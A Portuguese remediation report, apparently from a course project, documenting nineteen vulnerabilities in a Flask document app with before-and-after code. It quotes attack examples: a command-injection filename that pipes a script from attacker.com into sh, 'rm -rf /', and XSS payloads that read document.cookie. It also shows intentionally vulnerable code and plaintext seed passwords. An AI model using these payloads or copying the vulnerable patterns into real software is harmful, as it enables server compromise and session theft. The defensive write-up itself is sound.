# Stage 3 - Correções de Vulnerabilidades

---

## V-01 — SQL Injection

**Problema:**
A função `prepare_query` em `utils.py` aceitava SQL e parâmetros, mas em vez de usar parametrização real do psycopg2, fazia string formatting com `%`. Isto permitia a um atacante injetar SQL arbitrário nos campos de login e listagem de documentos.

```python
# Antes — utils.py
def prepare_query(sql, params):
    sql = _log_query(sql, params)
    return sql

def _log_query(sql, params):
    try:
        return sql % params  # string formatting — vulnerável
    except Exception:
        return sql
```

```python
# Antes — db.py
def get_user_by_username(cur, username):
    query = utils.prepare_query("SELECT id, username, password, is_disabled FROM users WHERE username='%s'", username)
    cur.execute(query)
    return cur.fetchone()
```

```python
# Antes — app.py
def get_documents_for_user(cur, owner_id):
    query = f"""
        SELECT id,title,filename,uploaded_at
        FROM documents
        WHERE owner_id=%s
        ORDER BY uploaded_at DESC
    """ % owner_id
    cur.execute(query)
    return cur.fetchall()
```

**Fix:**
Substituída a string formatting por parametrização real do psycopg2 — o SQL e os parâmetros são passados separadamente ao `cur.execute()`, e o driver trata do escaping.

```python
# Depois — db.py
def get_user_by_username(cur, username):
    cur.execute(
        "SELECT id, username, password, is_disabled, role FROM users WHERE username = %s",
        (username,)
    )
    return cur.fetchone()
```

```python
# Depois — app.py
def get_documents_for_user(cur, owner_id):
    cur.execute(
        """
        SELECT id, title, filename, uploaded_at
        FROM documents
        WHERE owner_id = %s
        ORDER BY uploaded_at DESC
        """,
        (owner_id,)
    )
    return cur.fetchall()
```

O `prepare_query` em `utils.py` foi mantido mas já não é usado — devolve `sql, params` sem fazer formatting. Pode ser removido numa limpeza futura.

**Ficheiros:** `db.py`, `app.py`, `utils.py`

---

## V-02 — OS Command Injection ✅
 
**Problema:**
A função `extract_metadata` em `app.py` construía um comando shell por concatenação de strings (via `utils.build`) e executava-o com `os.popen()`. O `filename` vinha do caminho do ficheiro guardado em disco, que por sua vez derivava do nome original enviado pelo utilizador. Um atacante poderia enviar um ficheiro com nome como `foo; rm -rf /` ou `$(curl attacker.com/shell.sh | sh)` e executar código arbitrário no servidor.
 
```python
# Antes — app.py
def extract_metadata(filename):
    cmd = utils.build("stat ", str(filename), " 2>&1")
    return utils.call(cmd)
 
# utils.py
def call(cmd):
    return os.popen(cmd).read()
 
def build(*args):
    return " ".join(args)
```
 
**Fix:**
Eliminada por completo a invocação de processos externos. A função `extract_metadata` foi reescrita para usar `pathlib.Path.stat()` diretamente — uma chamada Python pura que não passa pelo shell nem lança subprocessos. A injeção de comandos torna-se estruturalmente impossível porque deixa de existir qualquer shell a interpretar strings.

O fix de V-02 e V-34 foram aplicados em conjunto: ao mesmo tempo que se eliminou o vetor de injeção, reduziram-se também os metadados guardados ao mínimo necessário (`size_bytes` e `extension`). Os imports de `subprocess` e `os.popen` foram removidos do ficheiro.
 
```python
# Depois — app.py
def extract_metadata(filepath):
    try:
        p = pathlib.Path(filepath)
        size = p.stat().st_size
        ext = p.suffix.lower()
        return f"size_bytes={size} extension={ext}"
    except Exception:
        return ""
```
 
As funções `build` e `call` em `utils.py` ficam agora sem uso (podem ser removidas numa limpeza futura a par de `prepare_query`).
 
**Ficheiros:** `app.py`

---

## V-03 — Upload sem validação ✅
 
**Problema:**
Três falhas em simultâneo. O `sanitize_filename` era ineficaz (apenas removia espaços, null bytes e barras invertidas) e o seu resultado era ignorado — o ficheiro era guardado com `uploaded_file.filename`, o nome original do utilizador. Não havia allowlist de extensões nem verificação do conteúdo real do ficheiro.
 
```python
# Antes — app.py
filename = utils.sanitize_filename(uploaded_file.filename)  # resultado ignorado
destination = upload_folder / uploaded_file.filename         # nome original usado
uploaded_file.save(destination)
```
 
```python
# Antes — utils.py
def sanitize_filename(filename):
    filename = filename.strip()
    filename = filename.replace("\x00", "")
    filename = filename.replace("\\", "/")
    return filename
```
 
Isto permitia:
- **Path traversal** — nome `../../etc/passwd` para escrever fora da pasta de uploads
- **Upload de ficheiros executáveis** — `.py`, `.sh`, `.php`, etc. sem qualquer restrição
- **Spoofing de tipo** — renomear um script malicioso para `documento.pdf`
**Fix:**
Substituído `sanitize_filename` por uma implementação que usa `werkzeug.secure_filename` (remove path traversal e caracteres perigosos) e valida a extensão contra uma allowlist. Adicionada função `validate_magic_bytes` que verifica os primeiros bytes do ficheiro. Em `app.py`, o ficheiro passa a ser guardado com o nome sanitizado e a inserção na BD usa também esse nome.
 
```python
# Depois — utils.py
ALLOWED_EXTENSIONS = {".pdf", ".txt", ".doc", ".docx", ".png", ".jpg", ".jpeg", ".xls", ".xlsx"}
 
MAGIC_BYTES = {
    ".txt":  [],
    ".pdf":  [(0, b"%PDF")],
    ".png":  [(0, b"\x89PNG")],
    ".jpg":  [(0, b"\xff\xd8\xff")],
    ".jpeg": [(0, b"\xff\xd8\xff")],
    ".doc":  [(0, b"\xd0\xcf\x11\xe0")],
    ".xls":  [(0, b"\xd0\xcf\x11\xe0")],
    ".docx": [(0, b"PK\x03\x04")],
    ".xlsx": [(0, b"PK\x03\x04")],
}
 
def sanitize_filename(filename):
    filename = secure_filename(filename)
    if not filename:
        return None
    ext = os.path.splitext(filename)[1].lower()
    if ext not in ALLOWED_EXTENSIONS:
        return None
    return filename
 
def validate_magic_bytes(file_stream, extension):
    signatures = MAGIC_BYTES.get(extension.lower(), [])
    if not signatures:
        return True
    header = file_stream.read(16)
    file_stream.seek(0)
    for offset, magic in signatures:
        if header[offset:offset + len(magic)] == magic:
            return True
    return False
```
 
```python
# Depois — app.py
filename = utils.sanitize_filename(uploaded_file.filename)
if not filename:
    flask.flash("File type not allowed.", "error")
    return flask.redirect(flask.url_for("documents_page"))
 
ext = os.path.splitext(filename)[1].lower()
if not utils.validate_magic_bytes(uploaded_file.stream, ext):
    flask.flash("File content does not match its extension.", "error")
    return flask.redirect(flask.url_for("documents_page"))

raw_bytes = uploaded_file.read()
encrypted_bytes = crypto.encrypt_file(raw_bytes)
with open(destination, "wb") as f:
    f.write(encrypted_bytes)  # ficheiro guardado com nome sanitizado e cifrado
```
 
**Ficheiros:** `utils.py`, `app.py`
 

---

## V-04 — IDOR `/documents/<id>` ✅

**Problema:**
A rota `GET /documents/<id>` não tinha `@login_required` nem verificação de ownership. Qualquer pessoa — incluindo utilizadores não autenticados — conseguia aceder ao detalhe de qualquer documento apenas sabendo (ou adivinhando por enumeração) o `id` inteiro.

```python
# Antes — app.py
@app.route("/documents/<int:document_id>")
def document_details(document_id):
    # sem autenticação, sem verificação de ownership
    cur.execute("SELECT ... FROM documents WHERE id = %s", (document_id,))
    row = cur.fetchone()
    if not row:
        return "Document not found", 404
    return flask.render_template("document_details.html", document=document)
```

**Fix:**
Adicionado `@login_required` para garantir que só utilizadores autenticados chegam à rota. Após obter o documento da base de dados, é verificado se o `user_id` da sessão corresponde ao `owner_id` do documento — se não corresponder, é consultada a tabela `document_shares` para verificar se o documento foi explicitamente partilhado com o utilizador atual. Só se nenhuma das condições se verificar é que a rota devolve 403. O enunciado define o admin como gestor de contas (enable/disable), sem qualquer acesso a documentos de outros utilizadores, pelo que não há exceção para admin.

**Nota:** a versão inicial do fix verificava apenas o ownership (bloqueando utilizadores com partilha explícita). A lógica owner-or-shared foi integrada posteriormente com o fix de V-32, resultando na implementação atual.

```python
# Depois — app.py
@app.route("/documents/<int:document_id>")
@login_required
def document_details(document_id):
    cur.execute("SELECT id, owner_id, title, filename, metadata FROM documents WHERE id = %s", (document_id,))
    row = cur.fetchone()

    if not row:
        flask.abort(404)

    current_user_id = flask.session.get("user_id")
    owner_id = row[1]
    is_owner = (current_user_id == owner_id)

    # V-04 + V-32 — só o dono ou utilizador com partilha explícita pode aceder
    if not is_owner:
        shared_row = db.get_shared_document_for_user(cur, document_id, current_user_id)
        if not shared_row:
            flask.abort(403)

    document = {"id": row[0], "title": row[2], "filename": row[3], "is_owner": is_owner}
    return flask.render_template("document_details.html", document=document, shared_with=shared_with)
```

**Ficheiros:** `app.py`

---

## V-05 — Autenticação insegura ✅

**Problema:**
Duas falhas em simultâneo. Primeiro, a lógica de autenticação tinha um bypass total para admin por precedência de operadores — qualquer pessoa que soubesse o username `admin` entrava sem password. Segundo, as passwords estavam guardadas em plaintext na base de dados.

```python
# Antes — app.py
is_admin = username == "admin"

if user and (user[2] == password and not user[3]) or is_admin:
    flask.session["user_id"] = user[0] if username != "admin" else 1
    flask.session["username"] = user[1] if username != "admin" else username
```

```sql
-- Antes — db/init.sql
INSERT INTO users (username, password, is_disabled) VALUES
('admin', 'L|fP1D%327mB', FALSE),
('alice', 'tth1mJj5?£58', FALSE),
('bob', 'De586:Iq6}?!', FALSE);
```

**Fix:**
Removido o bypass do admin e substituída a comparação de plaintext por `bcrypt.checkpw`. As passwords na base de dados foram substituídas por hashes bcrypt.

```python
# Depois — app.py
if user and not user[3] and bcrypt.checkpw(password.encode("utf-8"), user[2].encode("utf-8")):
    flask.session["user_id"] = user[0]
    flask.session["username"] = user[1]
```

```sql
-- Depois — db/init.sql
INSERT INTO users (username, password, is_disabled) VALUES
('admin', '$2b$12$6BnTJxmeFECG7AbuYWEjVumyRyxBYrtNgDOCElfcTaghwc9uhCSC6', FALSE),
('alice', '$2b$12$tQ1obAxwA4FGyi/4MWHMQe5a.AFdoQ9flqrrbg0sj2M5Ea8XEMzJe', FALSE),
('bob', '$2b$12$p60o3qELhyx9HTi4.wjq3ers2cUHGJWrVhRt5z3kE8mE9aNJBiozy', FALSE);
```

**Ficheiros:** `app.py`, `db/init.sql`

---

## V-06 — IDOR `/documents?user_id=X` ✅

**Problema:**
A rota `GET /documents` aceitava um parâmetro `user_id` via query string e usava-o diretamente para filtrar documentos, sem verificar se correspondia ao utilizador autenticado. Qualquer utilizador podia fazer `/documents?user_id=X` e ver os documentos de outro utilizador.

```python
# Antes — app.py
requested_user_id = flask.request.args.get("user_id")
current_user_id = flask.session.get("user_id")

owner_id = requested_user_id or current_user_id  # user_id externo aceite sem validação
```

**Fix:**
Adicionada verificação explícita: se o `user_id` pedido for diferente do utilizador autenticado, a rota devolve imediatamente 403. Nenhum utilizador, incluindo admins, pode aceder a documentos de outro — o enunciado define o admin exclusivamente como gestor de contas, sem qualquer acesso a documentos alheios.

```python
# Depois — app.py
requested_user_id = flask.request.args.get("user_id")
current_user_id = flask.session.get("user_id")

# V-IDOR — utilizador só pode ver os seus próprios documentos
if requested_user_id and str(requested_user_id) != str(current_user_id):
    flask.abort(403)

owner_id = current_user_id
```

O cast `str()` é necessário porque o `requested_user_id` chega como string do URL, enquanto o `current_user_id` guardado na sessão é um inteiro — sem o cast, a comparação falharia sempre e bloqueava o próprio utilizador.

**Ficheiros:** `app.py`

---

## V-07 — Sem RBAC ✅

**Problema:**
A sessão não continha nenhum campo `role`. Não existia decorator `admin_required`. As rotas de administração (`/admin/users`, `/admin/users/<id>/enable`, `/admin/users/<id>/disable`) não estavam implementadas. Qualquer utilizador autenticado poderia, em princípio, aceder a funcionalidades administrativas sem qualquer verificação de papel.

```python
# Antes — app.py: sem role na sessão
flask.session["user_id"] = user[0]
flask.session["username"] = user[1]
# role nunca era armazenado

# Sem decorator admin_required
# Rotas /admin/* não implementadas
```

```sql
-- Antes — init.sql: sem coluna role
CREATE TABLE users (
    id SERIAL PRIMARY KEY,
    username TEXT UNIQUE NOT NULL,
    password TEXT NOT NULL,
    is_disabled BOOLEAN DEFAULT FALSE
);
```

**Fix:**
Adicionada coluna `role` à tabela `users` com CHECK constraint (`'user'` ou `'admin'`). O utilizador `admin` tem `role = 'admin'`; os restantes têm `role = 'user'`. O login passa a guardar o `role` na sessão. Foi criado o decorator `admin_required` que verifica `session["role"] == "admin"` e devolve 403 caso contrário. As três rotas de administração foram implementadas e protegidas com `@admin_required`.

```sql
-- Depois — init.sql
CREATE TABLE users (
    id SERIAL PRIMARY KEY,
    username TEXT UNIQUE NOT NULL,
    password TEXT NOT NULL,
    is_disabled BOOLEAN DEFAULT FALSE,
    role TEXT NOT NULL DEFAULT 'user' CHECK (role IN ('user', 'admin'))
);

INSERT INTO users (username, password, is_disabled, role) VALUES
('admin', '...', FALSE, 'admin'),
('alice', '...', FALSE, 'user'),
('bob',   '...', FALSE, 'user');
```

```python
# Depois — app.py: role guardado na sessão
flask.session["user_id"] = user[0]
flask.session["username"] = user[1]
flask.session["role"] = user[4]

# Decorator admin_required
def admin_required(fn):
    @functools.wraps(fn)
    def wrapper(*args, **kwargs):
        if "user_id" not in flask.session:
            flask.flash("Please log in first.", "error")
            return flask.redirect(flask.url_for("login"))
        if flask.session.get("role") != "admin":
            flask.abort(403)
        return fn(*args, **kwargs)
    return wrapper

# Rotas protegidas
@app.route("/admin/users")
@admin_required
def admin_users(): ...

@app.route("/admin/users/<int:user_id>/disable", methods=["POST"])
@admin_required
def admin_disable_user(user_id): ...

@app.route("/admin/users/<int:user_id>/enable", methods=["POST"])
@admin_required
def admin_enable_user(user_id): ...
```

**Ficheiros:** `db/init.sql`, `web/app/db.py`, `web/app/app.py`, `web/templates/users.html`

---

## V-08 — XSS refletido via ?uploaded= ✅

**Problema:**
Após um upload bem-sucedido, o servidor redirecionava para /documents?uploaded=<título>. O script.js lia esse parâmetro e inseria-o no DOM com innerHTML, sem sanitização:

```javascript
li.innerHTML = `Document uploaded: ${title}`;
```
Um atacante podia construir uma URL maliciosa como /documents?uploaded=<img src=x onerror=alert(document.cookie)>. Se enviada a um utilizador autenticado, o payload JavaScript seria executado no contexto da aplicação, permitindo roubo de cookies ou outras ações maliciosas.

**Fix:**
No servidor (app.py), substituído o redirect com ?uploaded= pelo mecanismo de flash do Flask — a mensagem passa a viajar na sessão (server-side), nunca na URL:

```python
# Antes
return flask.redirect(flask.url_for("documents_page", uploaded=title))
# Depois
flask.flash(f"Document uploaded: {title}", "success")
return flask.redirect(flask.url_for("documents_page"))
```

No cliente (script.js), removido o bloco que lia ?uploaded= da URL — deixa de ser necessário pois a mensagem é agora renderizada pelo Jinja2 no base.html, que escapa HTML automaticamente.

**Ficheiros:** web/app/app.py, web/static/script.js

---

## V-09 — XSS armazenado via data-title ✅

**Problema:**
Quando a página de documentos carrega, o Jinja2 escreve o título de cada documento num atributo HTML:

```html
<button class="details-btn" data-title="{{ doc.title }}">
```

O Jinja2 escapa corretamente o valor neste ponto. No entanto, quando o utilizador clica no botão, o script.js lia esse valor via btn.dataset.title e inseria-o no DOM com innerHTML:

```javascript
element.innerHTML = "Title: " + value;
```

Isto anulava a proteção do Jinja2 — se um atacante tivesse conseguido guardar um título com conteúdo malicioso na base de dados (ex: <img src=x onerror=alert(1)>), o browser executaria o payload no momento do clique.

**Fix:**
Substituído innerHTML por textContent, que trata o valor como texto puro e nunca o interpreta como markup:

```javascript
element.textContent = "Title: " + value;
```

Esta alteração foi feita em conjunto com o V-08.

**Ficheiros:** web/static/script.js

---

## V-10 — Sem CSRF ✅

**Problema:**
Nenhum formulário tinha token CSRF. Um atacante podia induzir um utilizador autenticado a submeter um pedido POST para a aplicação a partir de um site externo (ex: carregar uma imagem ou fazer clique num link malicioso), e a app aceitaria a ação como legítima — porque não havia forma de distinguir um pedido legítimo de um forjado. As ações vulneráveis incluíam login, upload de documentos, partilha de documentos e as ações de enable/disable de utilizadores (admin).

O `SameSite=Lax` (V-17) mitiga CSRF em navegadores modernos para pedidos de navegação de topo, mas não protege pedidos iniciados por `<form>` ou `fetch` em contextos cross-origin. O token CSRF é a defesa correta e independente do browser.

```html
<!-- Antes — login.html (e todos os outros templates) -->
<form method="post">
  <label>Username</label>
  <input type="text" name="username" required>
  <!-- sem token CSRF -->
</form>
```

```python
# Antes — app.py
# Sem qualquer inicialização de proteção CSRF
app.secret_key = secret_key
```

**Fix:**
Adicionada a extensão **Flask-WTF** (`CSRFProtect`), que gera um token criptograficamente seguro por sessão, exige a sua presença em todos os pedidos POST/PUT/PATCH/DELETE, e devolve 400 se o token estiver ausente ou for inválido.

```txt
# requirements.txt
Flask-WTF==1.2.2
```

```python
# Depois — app.py
from flask_wtf.csrf import CSRFProtect

def create_app():
    ...
    app.secret_key = secret_key

    # V-10 — CSRF protection
    csrf = CSRFProtect(app)
    ...
    register_routes(app)
    # Sem isenção para nenhuma rota — login incluído
    return app
```

Token adicionado a todos os formulários POST, incluindo o login:

```html
<!-- login.html -->
<form method="post">
  <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
  ...
</form>

<!-- documents.html -->
<form method="post" action="{{ url_for('upload_document') }}" enctype="multipart/form-data">
  <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
  ...
</form>

<!-- document_details.html -->
<form method="post" action="{{ url_for('share_document', document_id=document.id) }}">
  <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
  ...
</form>

<!-- users.html (disable e enable) -->
<form method="post" action="{{ url_for('admin_disable_user', user_id=user.id) }}">
  <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
  ...
</form>
```

O `CSRFProtect` usa a `SECRET_KEY` já obrigatória desde a V-14 para assinar os tokens — sem chave forte, os tokens seriam forjáveis.

**Nota:** numa versão intermédia o `POST /login` estava isento de CSRF via `csrf.exempt(app.view_functions["login"])` para não quebrar o teste de delivery existente. A isenção foi posteriormente removida — o login passou a exigir token CSRF como qualquer outro endpoint POST — e o teste `test_delivery_auth_flow.py` foi atualizado em conformidade: faz `GET /login` para obter o token, e inclui-o no `POST`.

```python
# tests/test_delivery_auth_flow.py — após correção
def _get_csrf_token(session: requests.Session) -> str:
    resp = session.get(_url("/login"), timeout=10)
    resp.raise_for_status()
    match = re.search(r'name="csrf_token"\s+value="([^"]+)"', resp.text)
    assert match, "CSRF token not found in login page"
    return match.group(1)

def test_login_logout_flow():
    session = requests.Session()
    csrf_token = _get_csrf_token(session)
    login_resp = session.post(
        _url("/login"),
        data={"username": "alice", "password": "tth1mJj5?£58", "csrf_token": csrf_token},
        allow_redirects=False,
        timeout=10,
    )
    assert login_resp.status_code in (302, 303)
    ...
```

**Ficheiros:** `requirements.txt`, `app.py`, `login.html`, `documents.html`, `document_details.html`, `users.html`, `tests/test_delivery_auth_flow.py`

---

## V-11 — `.env` não está no `.gitignore` ✅

**Problema:**
O ficheiro `.env` continha credenciais reais da aplicação (`SECRET_KEY`, `DB_USER`, `DB_PASSWORD`, `API_KEY`, `DB_NAME`) e não estava listado no `.gitignore`. Qualquer `git add .` incluiria o ficheiro no staging, expondo as credenciais no histórico do repositório. Adicionalmente, não existia nenhum `.env.example`, pelo que não havia forma de saber quais variáveis de ambiente eram necessárias sem aceder ao ficheiro real.

```
# Antes — .gitignore (sem qualquer entrada para .env)
venv/
.venv/
env/
ENV/
# ...
```

**Fix:**
Adicionadas as entradas `.env` e `.env.*` ao `.gitignore` para cobrir variantes (`.env.local`, `.env.production`, etc.). A exceção `!.env.example` garante que o template pode ser commitado. O ficheiro foi removido do tracking com `git rm --cached .env`.

Foi criado um `.env.example` com as chaves necessárias mas sem valores sensíveis, servindo de documentação para quem clonar o repositório.

```
# Depois — .gitignore (secção adicionada)
# Environment variables (NUNCA commitar!)
.env
.env.*
!.env.example
```

```
# .env.example (commitado no repositório)
SECRET_KEY=
DB_USER=postgres
DB_PASSWORD=
API_KEY=
DB_NAME=docdb
```

Com o `.env` removido do repositório, as variáveis de ambiente foram migradas para **GitHub Secrets** e injetadas nos steps relevantes dos workflows de CI e CD:

```yaml
# ci.yml e cd.yml
env:
  SECRET_KEY: ${{ secrets.SECRET_KEY }}
  DB_USER: ${{ secrets.DB_USER }}
  DB_PASSWORD: ${{ secrets.DB_PASSWORD }}
  API_KEY: ${{ secrets.API_KEY }}
  DB_NAME: ${{ secrets.DB_NAME }}
```

**Ficheiros:** `.gitignore`, `.env.example`, `.github/workflows/ci.yml`, `.github/workflows/cd.yml`

---

## V-12 — `debug=True` em produção ✅

**Problema:**
O servidor Flask era iniciado com `debug=True` hardcoded. Em modo debug, o Werkzeug ativa uma consola interativa acessível via browser sempre que ocorre um erro não tratado. Esta consola permite executar código Python arbitrário no servidor (RCE), bastando provocar um erro e interagir com o debugger.

```python
# Antes — run.py
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000, debug=True)
```

**Fix:**
O valor de `debug` passa a ser lido da variável de ambiente `FLASK_DEBUG`. A comparação `== "1"` garante que qualquer valor diferente de `"1"` (incluindo ausência da variável) resulta em `False` — o modo debug fica desativado por omissão. No `.env` de produção, a variável está explicitamente definida como `0`.

```python
# Depois — run.py
if __name__ == "__main__":
    app = app.create_app()
    debug = os.getenv("FLASK_DEBUG") == "1"
    app.run(host="0.0.0.0", port=8000, debug=debug)
```

```dotenv
# .env
FLASK_DEBUG=0
```

**Ficheiros:** `run.py`, `.env`

---

## V-13 — Credenciais da BD hardcoded no Dockerfile ✅

**Problema:**
O `db/Dockerfile` definia as credenciais da base de dados diretamente com instruções `ENV`. Estas variáveis ficam gravadas nas camadas da imagem Docker e são visíveis a qualquer pessoa com acesso à imagem — via `docker inspect`, `docker history`, ou simplesmente ao publicar a imagem num registry.

```dockerfile
# Antes — db/Dockerfile
FROM postgres:15

COPY init.sql /docker-entrypoint-initdb.d/

ENV POSTGRES_DB=docdb
ENV POSTGRES_USER=postgres
ENV POSTGRES_PASSWORD=postgres   # credenciais hardcoded na imagem
```

**Fix:**
Removidos os três `ENV` com credenciais do Dockerfile. A imagem passa a não conter qualquer segredo — é apenas responsável por copiar o script de inicialização. As credenciais são injetadas em runtime pelo docker-compose, que as lê do `.env` (protegido pelo `.gitignore` desde V-11).

```dockerfile
# Depois — db/Dockerfile
FROM postgres:15

COPY init.sql /docker-entrypoint-initdb.d/
```

```yaml
# Depois — docker-compose.yml (dev)
db:
  build: ./db
  environment:
    - POSTGRES_DB=${DB_NAME}
    - POSTGRES_USER=${DB_USER}
    - POSTGRES_PASSWORD=${DB_PASSWORD}
  volumes:
    - pgdata:/var/lib/postgresql/data
```

```yaml
# Depois — docker-compose_deploy.yml (prod)
db:
  image: ${DB_IMAGE}
  environment:
    - POSTGRES_DB=${DB_NAME}
    - POSTGRES_USER=${DB_USER}
    - POSTGRES_PASSWORD=${DB_PASSWORD}
  volumes:
    - pgdata:/var/lib/postgresql/data
  restart: unless-stopped
```

As variáveis `DB_NAME`, `DB_USER` e `DB_PASSWORD` já estavam definidas no `.env` desde o início do projeto — não foi necessário adicionar nenhuma nova variável.

**Ficheiros:** `db/Dockerfile`, `docker-compose.yml`, `docker-compose_deploy.yml`

---

## V-14 — `SECRET_KEY` com fallback fraco ✅

**Problema:**
Se a variável de ambiente `SECRET_KEY` não estivesse definida, a app usava `"dev-secret"` como fallback. Esta chave é pública, curta e previsível. O Flask usa a `secret_key` para assinar os cookies de sessão — se um atacante a conhecer, consegue forjar um cookie com qualquer `user_id`, incluindo o do admin.

```python
# Antes — app.py
app.secret_key = os.getenv("SECRET_KEY", "dev-secret")
```

```
# Antes — .env
SECRET_KEY=dev-secret-key
```

**Fix:**
A app passa a recusar arrancar se a `SECRET_KEY` não estiver definida. O valor no `.env` foi substituído por uma chave gerada com `secrets.token_hex(32)`.

```python
# Depois — app.py
secret_key = os.getenv("SECRET_KEY")
if not secret_key:
    raise RuntimeError("SECRET_KEY não está definida")
app.secret_key = secret_key
```

```
# Depois — .env
SECRET_KEY=<chave gerada com secrets.token_hex(32)>
```

**Ficheiros:** `app.py`, `.env`

---

## V-15 — Sem rate limiting no login ✅

**Problema:**
O endpoint `POST /login` não tinha qualquer limitação de pedidos. Um atacante podia fazer tentativas ilimitadas de autenticação, tornando ataques de brute force e credential stuffing completamente livres — sem bloqueio, sem atraso, sem deteção.

```python
# Antes — app.py
@app.route("/login", methods=["GET", "POST"])
def login():
    # sem qualquer rate limiting
    username = flask.request.form.get("username", "")
    password = flask.request.form.get("password", "")
    ...
```

**Fix:**
Integrado o **Flask-Limiter** com uma estratégia de chave dupla — por IP e por username — aplicada exclusivamente aos pedidos POST. A dupla chave é necessária porque limitar só por IP não protege contra credential stuffing com IPs rotativos (proxies, botnets), e limitar só por username não protege contra brute force distribuído a um único utilizador.

```txt
# requirements.txt
Flask-Limiter>=3.5
```

```python
# Depois — app.py
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

def create_app():
    ...
    limiter = Limiter(
        key_func=get_remote_address,
        app=app,
        default_limits=[],
        storage_uri=os.getenv("RATELIMIT_STORAGE_URI", "memory://"),
    )
    app.limiter = limiter
```

```python
def _login_ip_key():
    return f"ip:{get_remote_address()}"

def _login_user_key():
    username = flask.request.form.get("username", "").lower().strip()
    return f"user:{username}"

@app.route("/login", methods=["GET", "POST"])
@app.limiter.limit("10 per minute; 30 per hour", key_func=_login_ip_key, methods=["POST"])
@app.limiter.limit("5 per minute; 20 per hour", key_func=_login_user_key, methods=["POST"])
def login():
    ...
```

```python
@app.errorhandler(429)
def ratelimit_handler(e):
    flask.flash("Demasiadas tentativas. Tenta novamente mais tarde.", "error")
    retry_after = getattr(e, "retry_after", None)
    response = flask.make_response(flask.render_template("login.html"), 429)
    if retry_after:
        response.headers["Retry-After"] = str(int(retry_after.total_seconds()))
    return response
```

Os limites aplicados são:
- **Por IP:** 10 tentativas/minuto e 30/hora — bloqueia brute force simples
- **Por username:** 5 tentativas/minuto e 20/hora — bloqueia credential stuffing com IPs rotativos

O handler de 429 devolve o header `Retry-After` e uma mensagem de erro legível. O storage é configurável via `RATELIMIT_STORAGE_URI` — `memory://` por defeito (adequado para um único processo), Redis em produção com múltiplos workers.

**Ficheiros:** `app.py`, `requirements.txt`

---

## V-16 — Sem audit logging ✅

**Problema:**
Nenhum evento de segurança era registado — logins (bem-sucedidos ou falhados), acessos a documentos, uploads, downloads, partilhas e ações administrativas aconteciam sem qualquer rasto. Sem logging, é impossível detetar ataques, auditar comportamentos suspeitos ou reconstruir o que aconteceu após um incidente.

**Fix:**
Criado um módulo `audit.py` com uma função `log_event()` que escreve eventos na tabela `audit_logs` da base de dados. Cada registo guarda o tipo de evento, o `user_id` e `username` do utilizador, o IP do pedido, um campo `details` com contexto adicional, e o timestamp UTC.

```python
# audit.py
_EVENTS_REQUIRING_IP = frozenset({
    "login_success",
    "login_failure",
    "logout",
})

def log_event(cur, event_type, user_id=None, username=None, details=None):
    ip_address = None
    if event_type in _EVENTS_REQUIRING_IP:
        try:
            ip_address = flask.request.remote_addr
        except RuntimeError:
            pass
    cur.execute(
        """
        INSERT INTO audit_logs (event_type, user_id, username, ip_address, details, created_at)
        VALUES (%s, %s, %s, %s, %s, %s)
        """,
        (event_type, user_id, username, ip_address, details,
         datetime.datetime.now(datetime.timezone.utc)),
    )
```

```sql
-- init.sql
CREATE TABLE audit_logs (
    id          SERIAL PRIMARY KEY,
    event_type  TEXT NOT NULL,
    user_id     INTEGER REFERENCES users(id) ON DELETE SET NULL,
    username    TEXT,
    ip_address  TEXT,
    details     TEXT,
    created_at  TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP
);
```

Eventos registados em `app.py`:

| Evento | Quando |
|---|---|
| `login_success` | Login bem-sucedido |
| `login_failure` | Credenciais erradas ou conta desativada |
| `logout` | Sessão terminada |
| `document_view` | Acesso à página de detalhe de um documento |
| `document_upload` | Upload de ficheiro concluído |
| `document_download` | Download de documento próprio |
| `document_share` | Partilha de documento com outro utilizador |
| `shared_document_download` | Download de documento partilhado |
| `admin_users_view` | Admin acede à lista de utilizadores |
| `admin_user_disable` | Admin desativa uma conta |
| `admin_user_enable` | Admin ativa uma conta |

No caso de `login_failure`, o campo `details` distingue entre `bad_credentials` e `account_disabled`.

**Ficheiros:** `audit.py` (novo), `app.py`, `init.sql`

---

## V-17 — Cookies sem flags de segurança ✅

**Problema:**
Os cookies de sessão eram emitidos sem flags de segurança. Sem `HttpOnly`, o cookie é acessível via JavaScript, tornando-o vulnerável a roubo por XSS. Sem `Secure`, o cookie pode ser transmitido em HTTP não cifrado. Sem `SameSite`, não há proteção básica contra CSRF.

```python
# Antes — app.py (ausência de configuração)
app.secret_key = secret_key
app.config["UPLOAD_FOLDER"] = UPLOAD_FOLDER
# Sem qualquer configuração de flags nos cookies
```

**Fix:**
Adicionadas as três flags de segurança na configuração da app, imediatamente após a definição da `secret_key`.

```python
# Depois — app.py
app.secret_key = secret_key

app.config["SESSION_COOKIE_SECURE"] = True
app.config["SESSION_COOKIE_HTTPONLY"] = True
app.config["SESSION_COOKIE_SAMESITE"] = "Lax"

app.config["UPLOAD_FOLDER"] = UPLOAD_FOLDER
```

**Ficheiros:** `app.py`

---

## V-18 — Sem security headers HTTP ✅

**Problema:**
A aplicação não enviava nenhum header de segurança nas respostas HTTP, deixando o browser sem instruções sobre o que pode ou não fazer. Isto expõe a aplicação a vários ataques:

Sem Content-Security-Policy: scripts injetados por XSS podem ser executados livremente.
Sem X-Frame-Options: a aplicação pode ser carregada num <iframe> noutro site, permitindo clickjacking.
Sem X-Content-Type-Options: o browser pode interpretar um ficheiro como um tipo diferente do declarado, permitindo execução de scripts disfarçados.
Sem Referrer-Policy: URLs internas podem ser expostas a sites externos via header Referer.

**Fix:**
Adicionado um hook after_request em register_routes que injeta os headers de segurança em todas as respostas:

```python
@app.after_request
def set_security_headers(response):
response.headers["X-Frame-Options"] = "DENY"
response.headers["X-Content-Type-Options"] = "nosniff"
response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
response.headers["Content-Security-Policy"] = "default-src 'self'"
return response
```

**Ficheiros:** web/app/app.py

---

## V-19 — PyYAML 5.1 vulnerável 

**Problema:**
A versão 5.1 do PyYAML tem CVEs conhecidos que permitem execução de código arbitrário (RCE) através de deserialização de YAML não segura.

```txt
# Antes — requirements.txt
PyYAML==5.1
```

**Fix:**
Atualizada a versão para 6.0.2.

```txt
# Depois — requirements.txt
PyYAML==6.0.2
```

**Ficheiros:** `requirements.txt`

**Referência** https://nvd.nist.gov/vuln/detail/cve-2020-14343

---

